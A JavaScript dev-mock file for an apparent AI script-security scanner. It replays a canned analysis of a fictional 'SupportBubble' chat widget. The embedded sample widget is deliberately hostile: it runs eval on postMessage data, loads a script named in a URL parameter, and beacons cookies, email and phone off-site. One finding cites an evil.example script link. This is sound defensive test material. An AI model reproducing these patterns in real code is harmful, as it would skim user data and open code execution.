// Front-end dev mock. When ?devmock=1 is set (or the backend is unreachable and
// the user opts to replay), this plays a realistic NDJSON event sequence that
// follows CONTRACT.md exactly — a SupportBubble chat-widget / skimmer analysis
// with ~9 findings, data flows, compliance, CSP and indicators. It never calls
// the real model, so it is safe to run repeatedly during development.

export const DEVMOCK_SCRIPT = `/*! SupportBubble chat widget v2.4.1 */
(function (w, d) {
  var API = "https://api.supportbubble.io/v2";
  var KEY = "sb_live_9f8a7c6d5e4b3a2f1e0d9c8b";
  var cfg = JSON.parse(localStorage.getItem("sb_cfg") || "{}");

  function load(src) {
    var s = d.createElement("script");
    s.src = src;
    d.head.appendChild(s);
  }

  // Load locale pack from query string, e.g. ?sb_lang=https://cdn.supportbubble.io/fr.js
  var lang = new URLSearchParams(location.search).get("sb_lang");
  if (lang) load(lang);

  function render(msg) {
    var box = d.getElementById("sb-messages");
    box.innerHTML += '<div class="sb-msg">' + msg.text + "</div>";
  }

  w.addEventListener("message", function (e) {
    if (e.data && e.data.type === "sb:msg") render(e.data);
    if (e.data && e.data.type === "sb:eval") eval(e.data.code);
  });

  function identify() {
    var email = d.querySelector("input[type=email]");
    var user = {
      email: email ? email.value : null,
      session: d.cookie,
      url: location.href,
      ref: d.referrer,
      ua: navigator.userAgent,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    navigator.sendBeacon(API + "/identify?key=" + KEY, JSON.stringify(user));
  }

  d.addEventListener("change", function (e) {
    if (e.target.type === "email" || e.target.name === "phone") identify();
  });

  new Image().src = "http://px.supportbubble.io/i.gif?cid=" + (cfg.cid || "anon");
  w.SupportBubble = { open: function () { w.parent.postMessage({ type: "sb:open", cfg: cfg }, "*"); } };
})(window, document);
`;

const EVENTS = [
  {
    delay: 130,
    evt: {
      type: 'static',
      stats: { chars: 1562, lines: 46, minified: false, sha256: '9f2c4b7a1e83d05f6c9a2b4e7d81f03c5a6b9e2d4f7c1a0b3e6d9f2c5a8b1e4d' },
      domains: [
        { domain: 'api.supportbubble.io', count: 2 },
        { domain: 'cdn.supportbubble.io', count: 1 },
        { domain: 'px.supportbubble.io', count: 1 },
      ],
      findings: [
        { id: 'eval', severity: 'critical', category: 'Code execution', title: 'eval() on message data', count: 1, samples: [{ line: 24, offset: 812, code: 'if (e.data && e.data.type === "sb:eval") eval(e.data.code);' }] },
        { id: 'dynamic-script', severity: 'high', category: 'Script injection', title: 'createElement("script") from URL param', count: 1, samples: [{ line: 8, offset: 214, code: 'var s = d.createElement("script"); s.src = src;' }] },
        { id: 'innerhtml', severity: 'high', category: 'DOM manipulation', title: 'innerHTML sink with message text', count: 1, samples: [{ line: 19, offset: 690, code: "box.innerHTML += '<div class=\"sb-msg\">' + msg.text + '</div>';" }] },
        { id: 'sendbeacon', severity: 'high', category: 'Exfiltration', title: 'sendBeacon to third party', count: 1, samples: [{ line: 37, offset: 1180, code: 'navigator.sendBeacon(API + "/identify?key=" + KEY, JSON.stringify(user));' }] },
        { id: 'cookie-read', severity: 'medium', category: 'Sensitive data', title: 'document.cookie read', count: 1, samples: [{ line: 32, offset: 1010, code: 'session: d.cookie,' }] },
        { id: 'hardcoded-key', severity: 'medium', category: 'Secrets', title: 'Hardcoded API key', count: 1, samples: [{ line: 4, offset: 96, code: 'var KEY = "sb_live_9f8a7c6d5e4b3a2f1e0d9c8b";' }] },
        { id: 'insecure-http', severity: 'low', category: 'Transport', title: 'Insecure http:// pixel', count: 1, samples: [{ line: 44, offset: 1400, code: 'new Image().src = "http://px.supportbubble.io/i.gif?cid=" + (cfg.cid || "anon");' }] },
      ],
      localScore: 76,
      truncated: false,
    },
  },
  {
    delay: 1300, // ~1.43s to first token
    evt: {
      type: 'meta',
      risk: 'critical',
      score: 91,
      verdict: 'Third-party chat widget that harvests PII and executes attacker-controlled code — unsafe on any page handling customer or payment data.',
      vendor: 'SupportBubble chat widget v2.4.1 (unverified)',
      category: 'chat',
      summary: 'This widget reads email, phone and cookie values from the host page and beacons them to api.supportbubble.io on every input change. It also evaluates arbitrary code received via window.postMessage and injects remote scripts from a URL query parameter, giving any parent frame or crafted link full script execution in the page origin. The combination of silent PII collection and multiple code-execution sinks makes it a Magecart-grade risk.',
    },
  },
  { delay: 90, evt: { type: 'behavior', text: 'Registers a global window "message" listener with no origin check' } },
  { delay: 70, evt: { type: 'behavior', text: 'Reads input[type=email] and input[name=phone] values on every change event' } },
  { delay: 70, evt: { type: 'behavior', text: 'Collects document.cookie, referrer, user-agent and timezone as a fingerprint' } },
  { delay: 70, evt: { type: 'behavior', text: 'Loads an external script whose URL comes from the ?sb_lang query parameter' } },
  { delay: 70, evt: { type: 'behavior', text: 'Posts widget config to the parent frame with target origin "*"' } },

  { delay: 90, evt: { type: 'flow', data: 'email, phone, cookies, URL, referrer, user-agent, timezone', destination: 'https://api.supportbubble.io/v2/identify', method: 'sendBeacon', sensitivity: 'critical' } },
  { delay: 80, evt: { type: 'flow', data: 'client id (cid)', destination: 'http://px.supportbubble.io/i.gif', method: 'Image pixel (cleartext)', sensitivity: 'medium' } },
  { delay: 80, evt: { type: 'flow', data: 'widget config', destination: 'parent window (postMessage "*")', method: 'postMessage', sensitivity: 'high' } },
  { delay: 80, evt: { type: 'flow', data: 'attacker-supplied locale URL', destination: 'cdn.supportbubble.io / arbitrary host', method: 'script src injection', sensitivity: 'high' } },

  { delay: 120, evt: { type: 'finding', id: 'f1', severity: 'critical', title: 'Remote code execution via eval() of postMessage data', category: 'Code execution', evidence: 'w.addEventListener("message", function (e) {\n  if (e.data && e.data.type === "sb:eval") eval(e.data.code);\n});', line: 24, impact: 'Any frame — including a malicious iframe/ad or a page that embeds this one — can send {type:"sb:eval", code:"..."} and run arbitrary JavaScript in the host origin, enabling full card-skimming or account takeover.', recommendation: 'Delete the eval branch entirely. Never execute code delivered over postMessage. If dynamic behavior is required, use a strict command allow-list with no code evaluation.', cwe: 'CWE-95', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f2', severity: 'critical', title: 'Missing origin check on message listener', category: 'Input validation', evidence: 'w.addEventListener("message", function (e) {\n  if (e.data && e.data.type === "sb:msg") render(e.data);', line: 22, impact: 'The handler trusts messages from any origin. Combined with the eval() and innerHTML sinks, this is the entry point for a cross-origin attacker to drive both.', recommendation: 'Validate e.origin against an explicit allow-list before processing any message, and reject unexpected message shapes.', cwe: 'CWE-346', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f3', severity: 'high', title: 'PII exfiltration to third-party endpoint', category: 'Data exfiltration', evidence: 'var user = { email: email ? email.value : null, session: d.cookie, url: location.href, ... };\nnavigator.sendBeacon(API + "/identify?key=" + KEY, JSON.stringify(user));', line: 37, impact: 'Customer email, session cookies and a device fingerprint are sent to api.supportbubble.io on every input change, with no consent gate. On a checkout page this is a reportable data breach and a PCI/GDPR violation.', recommendation: 'Remove cookie and email collection. Gate any analytics behind explicit consent and send only non-identifying data over an approved, contracted endpoint.', cwe: 'CWE-201', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f4', severity: 'high', title: 'DOM XSS via innerHTML with untrusted message text', category: 'Cross-site scripting', evidence: "box.innerHTML += '<div class=\"sb-msg\">' + msg.text + '</div>';", line: 19, impact: 'msg.text originates from postMessage and is concatenated into innerHTML unescaped, allowing HTML/script injection into the page DOM.', recommendation: 'Use textContent, or sanitize with a vetted library. Never build DOM from untrusted strings via innerHTML.', cwe: 'CWE-79', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f5', severity: 'high', title: 'Remote script injection from URL query parameter', category: 'Script injection', evidence: 'var lang = new URLSearchParams(location.search).get("sb_lang");\nif (lang) load(lang); // load() sets script.src = lang', line: 15, impact: 'A crafted link such as ?sb_lang=https://evil.example/x.js causes the page to load and execute an attacker-chosen script, a classic supply-chain / reflected injection vector.', recommendation: 'Never derive a script src from user-controllable input. Restrict locale packs to a hard-coded map of allowed filenames on your own origin.', cwe: 'CWE-829', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f6', severity: 'medium', title: 'Session cookie read and transmitted', category: 'Sensitive data', evidence: 'session: d.cookie,', line: 32, impact: 'All non-HttpOnly cookies, potentially including session tokens, are read and beaconed off-origin, enabling session hijacking.', recommendation: 'Do not read document.cookie. Mark session cookies HttpOnly and Secure so client scripts cannot access them.', cwe: 'CWE-359', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f7', severity: 'medium', title: 'Hardcoded API key in client code', category: 'Secrets exposure', evidence: 'var KEY = "sb_live_9f8a7c6d5e4b3a2f1e0d9c8b";', line: 4, impact: 'A live API key is shipped to every browser and appended to request URLs, where it is logged by proxies and CDNs and can be abused by anyone who views source.', recommendation: 'Rotate the exposed key immediately. Use short-lived, origin-scoped tokens issued server-side; never embed live secrets in client scripts.', cwe: 'CWE-798', confidence: 'high' } },
  { delay: 110, evt: { type: 'finding', id: 'f8', severity: 'low', title: 'Tracking pixel loaded over cleartext HTTP', category: 'Transport security', evidence: 'new Image().src = "http://px.supportbubble.io/i.gif?cid=" + (cfg.cid || "anon");', line: 44, impact: 'The pixel request is sent over http://, exposing the client id to network observers and triggering mixed-content warnings on HTTPS pages.', recommendation: 'Use https:// for all requests, or remove the pixel. Enforce upgrade-insecure-requests via CSP.', cwe: 'CWE-319', confidence: 'medium' } },
  { delay: 110, evt: { type: 'finding', id: 'f9', severity: 'low', title: 'Browser fingerprinting signals collected', category: 'Privacy', evidence: 'ua: navigator.userAgent,\ntz: Intl.DateTimeFormat().resolvedOptions().timeZone', line: 34, impact: 'User-agent and timezone are combined with other identifiers to build a persistent device fingerprint, a GDPR/CCPA concern without disclosure.', recommendation: 'Drop fingerprinting signals or disclose and gate them behind consent per your privacy policy.', cwe: 'CWE-359', confidence: 'medium' } },

  { delay: 120, evt: { type: 'compliance', pci: 'Fails PCI DSS 6.4.3 — the script is not inventoried, justified or integrity-controlled, and it can load unauthorized code via eval()/injection. Fails 11.6.1 — no mechanism would detect the unauthorized changes this widget can make to the payment page.', privacy: 'Collects email, cookies and fingerprint without a consent gate — GDPR Art. 6/7 and CCPA disclosure violations likely.', paymentPageSafe: false } },

  { delay: 90, evt: { type: 'recommendation', priority: 1, action: 'remove', text: 'Remove this widget from all payment and account pages immediately; it meets the bar for a Magecart-style skimmer.' } },
  { delay: 70, evt: { type: 'recommendation', priority: 2, action: 'fix', text: 'Rotate the exposed live API key sb_live_9f8a…c8b and audit its usage server-side.' } },
  { delay: 70, evt: { type: 'recommendation', priority: 3, action: 'sandbox', text: 'If the chat feature is required, isolate it in a sandboxed cross-origin iframe with no access to the parent DOM, cookies or inputs.' } },
  { delay: 70, evt: { type: 'recommendation', priority: 4, action: 'monitor', text: 'Deploy client-side monitoring (CSP report-uri + script integrity) to satisfy PCI 11.6.1 on remaining pages.' } },
  { delay: 70, evt: { type: 'recommendation', priority: 5, action: 'restrict', text: 'Restrict outbound connections with a connect-src allow-list so unexpected beacons are blocked and logged.' } },

  { delay: 110, evt: { type: 'csp', policy: "default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self' https:; frame-src 'self'; object-src 'none'; base-uri 'self'; upgrade-insecure-requests", notes: 'This policy blocks the eval() (no unsafe-eval), the ?sb_lang remote script (script-src self), the sendBeacon exfiltration (connect-src self) and the cleartext pixel (upgrade-insecure-requests). Add a report-uri to capture violations for PCI 11.6.1 evidence.' } },

  { delay: 90, evt: { type: 'indicator', kind: 'domain', value: 'api.supportbubble.io', note: 'Exfiltration endpoint (sendBeacon /v2/identify)' } },
  { delay: 55, evt: { type: 'indicator', kind: 'url', value: 'http://px.supportbubble.io/i.gif', note: 'Cleartext tracking pixel' } },
  { delay: 55, evt: { type: 'indicator', kind: 'key', value: 'sb_live_9f8a7c6d5e4b3a2f1e0d9c8b', note: 'Hardcoded live API key — rotate' } },
  { delay: 55, evt: { type: 'indicator', kind: 'selector', value: 'input[type=email], input[name=phone]', note: 'Inputs harvested on change' } },
  { delay: 55, evt: { type: 'indicator', kind: 'other', value: 'postMessage type "sb:eval"', note: 'Attacker code-execution channel' } },

  {
    delay: 140,
    evt: { type: 'done', ms: 2040, firstTokenMs: 1430, usage: { prompt_tokens: 1512, completion_tokens: 928 }, tokensPerSec: 1867, model: 'gpt-oss-120b', cached: false, replay: true },
  },
];

// Play the sequence, calling emit(evt) for each. Aborts cleanly via signal.
export function playDevMock(emit, signal) {
  return new Promise((resolve) => {
    let idx = 0;
    let timer = null;
    const stop = () => { clearTimeout(timer); resolve(); };
    if (signal) {
      if (signal.aborted) return stop();
      signal.addEventListener('abort', stop, { once: true });
    }
    const next = () => {
      if (signal && signal.aborted) return resolve();
      if (idx >= EVENTS.length) return resolve();
      const { delay, evt } = EVENTS[idx++];
      timer = setTimeout(() => {
        if (signal && signal.aborted) return resolve();
        emit(evt);
        next();
      }, delay);
    };
    next();
  });
}
